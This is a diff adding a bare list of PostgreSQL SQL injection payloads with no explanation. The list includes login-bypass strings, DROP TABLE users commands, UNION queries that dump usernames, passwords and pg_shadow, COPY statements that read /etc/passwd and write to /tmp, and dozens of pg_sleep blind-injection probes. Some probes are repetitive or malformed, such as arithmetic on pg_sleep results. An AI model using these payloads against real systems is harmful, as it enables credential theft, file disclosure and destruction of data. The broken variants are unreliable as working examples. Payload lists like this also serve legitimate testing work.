@@ -1,0 +1,62 @@
+' OR 1=1; --
+' OR 'a'='a'; --
+' OR 1=1--
+' OR 'a'='a--
+' OR 1=1/*
+' OR 'a'='a'/*
+' OR 1=1; DROP TABLE users; --
+' OR 'a'='a'; DROP TABLE users; --
+' UNION SELECT 1, table_name FROM information_schema.tables; --
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'; --
+' UNION SELECT 1, username || ':' || password FROM users; --
+' UNION SELECT 1, current_database(); --
+' UNION SELECT 1, current_user; --
+' UNION SELECT 1, session_user; --
+' UNION SELECT 1, current_setting('log_connections'); --
+' UNION SELECT 1, current_setting('log_statement'); --
+' UNION SELECT 1, current_setting('port'); --
+' UNION SELECT 1, current_setting('password_encryption'); --
+' UNION SELECT 1, current_setting('krb_server_keyfile'); --
+' UNION SELECT 1, current_setting('virtual_host'); --
+' UNION SELECT 1, current_setting('port'); --
+' UNION SELECT 1, current_setting('config_file'); --
+' UNION SELECT 1, current_setting('hba_file'); --
+' UNION SELECT 1, current_setting('data_directory'); --
+' UNION SELECT 1, * FROM pg_shadow; --
+' UNION SELECT 1, * FROM pg_group; --
+CREATE TABLE myfile (input TEXT);
+COPY myfile FROM '/etc/passwd';
+SELECT * FROM myfile;
+COPY myfile TO '/tmp/test';
+' OR (SELECT pg_sleep(5)); --
+' OR (SELECT CASE WHEN (NOW() > (NOW() + INTERVAL '5 seconds')) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (EXTRACT(EPOCH FROM NOW()) > (EXTRACT(EPOCH FROM NOW()) + 5)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (current_timestamp > (current_timestamp + INTERVAL '5 seconds')) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (current_date > (current_date + INTERVAL '5 days')) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (current_time > (current_time + INTERVAL '5 seconds')) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_backend_pid() IN (SELECT pg_backend_pid() FROM pg_stat_activity WHERE state = 'active' AND current_query = 'SELECT 1')) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) IS NULL) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) = pg_sleep(5)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) > pg_sleep(0)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) < pg_sleep(10)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) || pg_sleep(0)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) + pg_sleep(0)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) - pg_sleep(0)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) * pg_sleep(0)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (pg_sleep(5) / pg_sleep(0)) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (1=0) THEN pg_sleep(5) ELSE pg_sleep(0) END); --
+' OR (SELECT CASE WHEN (1=1) THEN NULL ELSE pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=0) THEN NULL ELSE pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=1) THEN TRUE ELSE pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=0) THEN TRUE ELSE pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=1) THEN FALSE ELSE pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=0) THEN FALSE ELSE pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=0) THEN pg_sleep(5) END); --
+' OR (SELECT CASE WHEN (1=1) THEN NULL END); --
+' OR (SELECT CASE WHEN (1=0) THEN NULL END); --
+' OR (SELECT CASE WHEN (1=1) THEN TRUE END); --
+' OR (SELECT CASE WHEN (1=0) THEN TRUE END); --
+' OR (SELECT CASE WHEN (1=1) THEN FALSE END); --
+' OR (SELECT CASE WHEN (1=0) THEN FALSE END); --
